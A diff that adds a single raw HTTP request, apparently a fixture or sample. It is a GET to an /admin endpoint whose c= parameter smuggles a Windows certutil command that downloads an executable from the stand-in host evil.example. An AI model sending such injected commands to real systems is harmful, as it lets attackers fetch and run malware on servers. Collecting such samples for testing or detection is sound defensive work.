@@ -1,0 +1,6 @@
+GET /admin?c=certutil%20-urlcache%20-f%20http://evil.example/x.exe%20y.exe HTTP/1.1
+Host: tools.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Accept: */*
+Content-Length: 0
+
